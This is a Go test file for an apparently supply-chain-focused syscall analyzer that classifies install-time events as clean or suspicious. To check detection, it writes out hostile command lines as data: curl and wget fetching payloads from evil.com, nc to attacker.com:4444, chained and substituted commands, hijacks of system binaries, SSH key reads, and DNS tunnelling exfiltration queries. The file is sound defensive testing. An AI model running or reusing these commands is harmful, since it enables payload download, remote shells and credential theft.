package analyzer

import (
	"testing"
	"time"

	"github.com/RalianENG/kojuto/internal/types"
)

func TestAnalyze_Clean(t *testing.T) {
	verdict, filtered := Analyze(nil)
	if verdict != types.VerdictClean {
		t.Errorf("expected clean, got %s", verdict)
	}

	if len(filtered) != 0 {
		t.Errorf("expected 0 filtered events, got %d", len(filtered))
	}

	verdict, _ = Analyze([]types.SyscallEvent{})
	if verdict != types.VerdictClean {
		t.Errorf("expected clean for empty slice, got %s", verdict)
	}
}

func TestAnalyze_Suspicious(t *testing.T) {
	events := []types.SyscallEvent{
		{
			Timestamp: time.Now(),
			PID:       1234,
			Syscall:   types.EventConnect,
			Family:    2,
			DstAddr:   "203.0.113.50",
			DstPort:   443,
		},
	}

	verdict, filtered := Analyze(events)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious, got %s", verdict)
	}

	if len(filtered) != 1 {
		t.Errorf("expected 1 suspicious event, got %d", len(filtered))
	}
}

func TestAnalyze_FiltersLoopback(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventConnect, DstAddr: "127.0.0.1", DstPort: 80, Family: 2},
		{Syscall: types.EventConnect, DstAddr: "::1", DstPort: 80, Family: 10},
		{Syscall: types.EventSendto, DstAddr: "0.0.0.0", DstPort: 53, Family: 2},
	}

	verdict, filtered := Analyze(events)
	if verdict != types.VerdictClean {
		t.Errorf("expected clean after filtering loopback, got %s", verdict)
	}

	if len(filtered) != 0 {
		t.Errorf("expected 0 suspicious events, got %d", len(filtered))
	}
}

func TestAnalyze_FiltersBenignExec(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/usr/bin/python", Cmdline: "python setup.py"},
		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c echo hello"},
	}

	verdict, _ := Analyze(events)
	if verdict != types.VerdictClean {
		t.Errorf("expected clean for benign exec, got %s", verdict)
	}
}

func TestAnalyze_SuspiciousExec(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/usr/bin/curl", Cmdline: "curl http://evil.com/payload"},
	}

	verdict, filtered := Analyze(events)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious for curl, got %s", verdict)
	}

	if len(filtered) != 1 {
		t.Errorf("expected 1 suspicious event, got %d", len(filtered))
	}
}

func TestAnalyze_ShellCBenign(t *testing.T) {
	// pip/setuptools routinely call sh -c with compiler and file commands.
	benignCases := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c gcc -o output.o input.c"},
		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c echo hello"},
		{Syscall: types.EventExecve, Comm: "/usr/bin/bash", Cmdline: "bash -c pkg-config --libs python3"},
		{Syscall: types.EventExecve, Comm: "/bin/dash", Cmdline: "dash -c command -v gcc"},
		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c 'cp file1 file2'"},
		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c \"mkdir -p /install/lib\""},
		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c test -f /usr/include/stdio.h"},
		// Benign command chains (all segments are safe commands).
		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c 'mkdir -p /install/lib && cp file1 /install/lib/'"},
		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c gcc -o out.o in.c && strip out.o"},
		// File ops targeting non-trusted directories are fine.
		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c cp file1 /install/lib/file1"},
	}

	verdict, filtered := Analyze(benignCases)
	if verdict != types.VerdictClean {
		t.Errorf("expected clean for benign sh -c, got %s with %d events", verdict, len(filtered))
		for _, e := range filtered {
			t.Logf("  flagged: %s %q", e.Comm, e.Cmdline)
		}
	}
}

func TestAnalyze_ShellCSuspicious(t *testing.T) {
	// Attack vectors that abuse sh -c to execute arbitrary code.
	cases := []struct {
		name string
		evt  types.SyscallEvent
	}{
		{
			name: "sh -c runs /tmp binary",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c /tmp/malware"},
		},
		{
			name: "sh -c runs unknown binary",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c /usr/local/sbin/backdoor --exfil"},
		},
		{
			name: "sh -c runs wget",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c wget http://evil.com -O /tmp/x"},
		},
		{
			name: "sh -c runs curl",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c curl http://evil.com/payload"},
		},
		{
			name: "dash -c runs nc",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/dash", Cmdline: "dash -c nc attacker.com 4444"},
		},
		{
			name: "bash -c runs python",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/usr/bin/bash", Cmdline: "bash -c python3 -c 'import os; os.system(\"id\")'"},
		},
		// Command chain attacks: safe command followed by malicious command.
		{
			name: "semicolon chain: echo; curl",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c echo x; curl http://evil.com"},
		},
		{
			name: "pipe chain: echo | nc",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c echo payload | nc attacker.com 4444"},
		},
		{
			name: "and chain: true && wget",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c true && wget http://evil.com -O /tmp/x"},
		},
		{
			name: "or chain: false || /tmp/malware",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c false || /tmp/malware"},
		},
		// env abuse: env can run arbitrary commands.
		{
			name: "env runs curl",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c env curl http://evil.com"},
		},
		// find -exec abuse.
		{
			name: "find -exec runs payload",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c find /tmp -exec /tmp/payload {} ;"},
		},
		// Backtick command substitution.
		{
			name: "backtick substitution",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c echo `curl evil.com`"},
		},
		// $() command substitution.
		{
			name: "dollar-paren substitution",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c echo $(curl evil.com)"},
		},
		// File ops targeting trusted directories (binary hijack).
		{
			name: "cp payload to /usr/local/bin",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c cp /tmp/payload /usr/local/bin/python3"},
		},
		{
			name: "ln -s to /usr/bin",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c ln -s /tmp/malware /usr/bin/node"},
		},
		{
			name: "mv to /bin",
			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c mv /tmp/backdoor /bin/sh"},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			verdict, _ := Analyze([]types.SyscallEvent{tc.evt})
			if verdict != types.VerdictSuspicious {
				t.Errorf("expected suspicious, got %s for: %s", verdict, tc.evt.Cmdline)
			}
		})
	}
}

func TestAnalyze_PythonCInlineCode(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/usr/bin/python3", Cmdline: "python3 -c import os; os.system('id')"},
	}

	verdict, _ := Analyze(events)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious for python3 -c, got %s", verdict)
	}
}

func TestAnalyze_BasenameSpoofing(t *testing.T) {
	// Attacker copies malware to /tmp/python3 — path must be checked, not just basename.
	events := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/tmp/python3", Cmdline: "python3 setup.py"},
	}

	verdict, _ := Analyze(events)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious for /tmp/python3 (basename spoofing), got %s", verdict)
	}
}

func TestAnalyze_EmptyDstAddr(t *testing.T) {
	// A connect event with empty address means the parser failed.
	// Must NOT be treated as benign.
	events := []types.SyscallEvent{
		{Syscall: types.EventConnect, DstAddr: "", DstPort: 443, Family: 2},
	}

	verdict, _ := Analyze(events)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious for empty DstAddr, got %s", verdict)
	}
}

func TestAnalyze_OpenatSensitive(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventOpenat, FilePath: "/home/dev/.ssh/id_rsa", OpenFlags: "O_RDONLY"},
	}

	verdict, filtered := Analyze(events)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious for SSH key access, got %s", verdict)
	}
	if len(filtered) != 1 {
		t.Errorf("expected 1 suspicious event, got %d", len(filtered))
	}
}

func TestAnalyze_RenameTrustedBinary(t *testing.T) {
	cases := []struct {
		name    string
		dstPath string
		want    string
	}{
		{"python3 hijack", "/usr/local/bin/python3", types.VerdictSuspicious},
		{"node hijack", "/usr/local/bin/node", types.VerdictSuspicious},
		{"sh hijack", "/bin/sh", types.VerdictSuspicious},
		{"new CLI script", "/usr/local/bin/my-tool", types.VerdictClean},
		{"install dir", "/install/lib/module.so", types.VerdictClean},
		{"tmp rename", "/tmp/a", types.VerdictClean},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			events := []types.SyscallEvent{
				{Syscall: types.EventRename, SrcPath: "/tmp/payload", DstPath: tc.dstPath},
			}
			verdict, _ := Analyze(events)
			if verdict != tc.want {
				t.Errorf("expected %s for dst=%s, got %s", tc.want, tc.dstPath, verdict)
			}
		})
	}
}

func TestAnalyze_BindListenAccept(t *testing.T) {
	// Server socket operations are always suspicious.
	for _, syscall := range []string{types.EventBind, types.EventListen, types.EventAccept} {
		events := []types.SyscallEvent{
			{Syscall: syscall, DstAddr: "0.0.0.0", DstPort: 4444},
		}
		verdict, _ := Analyze(events)
		if verdict != types.VerdictSuspicious {
			t.Errorf("expected suspicious for %s, got %s", syscall, verdict)
		}
	}
}

func TestAnalyze_DNSTunneling(t *testing.T) {
	// DNS tunneling: sendto to loopback:53 with suspicious query.
	// Using loopback so only the DNS query content determines the verdict
	// (loopback is normally benign, but tunneling overrides that).
	tunnelCases := []struct {
		name  string
		query string
		want  string
	}{
		// Suspicious: base64-encoded data in subdomain.
		{"base64 exfil", "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q.evil.com", types.VerdictSuspicious},
		// Suspicious: hex-encoded data in subdomain.
		{"hex exfil", "68656c6c6f20776f726c6420746869732069732061.evil.com", types.VerdictSuspicious},
		// Suspicious: very long query.
		{"long query", "aaaaaaaaaa.bbbbbbbbbb.cccccccccc.dddddddddd.eeeeeeeeee.ffffffffff.gggggggggg.hhhhhhhhhh.evil.com", types.VerdictSuspicious},
		// Clean: normal domain lookup (short labels, low entropy).
		{"normal domain", "www.google.com", types.VerdictClean},
		// Clean: pypi.org (benign suffix).
		{"pypi lookup", "files.pythonhosted.org", types.VerdictClean},
		// Clean: npm registry.
		{"npm lookup", "registry.npmjs.org", types.VerdictClean},
		// Clean: short subdomain.
		{"short sub", "api.github.com", types.VerdictClean},
		// Clean: only two labels (no subdomain to tunnel through).
		{"two labels", "evil.com", types.VerdictClean},
	}

	for _, tc := range tunnelCases {
		t.Run(tc.name, func(t *testing.T) {
			events := []types.SyscallEvent{
				{Syscall: types.EventSendto, DstAddr: "127.0.0.1", DstPort: 53, Family: 2, DNSQuery: tc.query},
			}
			verdict, _ := Analyze(events)
			if verdict != tc.want {
				t.Errorf("expected %s for query=%q, got %s", tc.want, tc.query, verdict)
			}
		})
	}
}

func TestShannonEntropy(t *testing.T) {
	// Low entropy: repeated character.
	if e := shannonEntropy("aaaaaaa"); e > 0.1 {
		t.Errorf("expected low entropy for 'aaaaaaa', got %f", e)
	}

	// High entropy: random-looking base64.
	if e := shannonEntropy("aGVsbG8gd29ybGQ"); e < 3.0 {
		t.Errorf("expected high entropy for base64, got %f", e)
	}

	// Empty string.
	if e := shannonEntropy(""); e != 0 {
		t.Errorf("expected 0 entropy for empty string, got %f", e)
	}
}

func TestAnalyze_SedExcluded(t *testing.T) {
	// sed is excluded from benignPaths because GNU sed -e can execute shell commands.
	events := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/usr/bin/sed", Cmdline: "sed -e 1e cat /etc/passwd"},
	}

	verdict, _ := Analyze(events)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious for sed, got %s", verdict)
	}
}
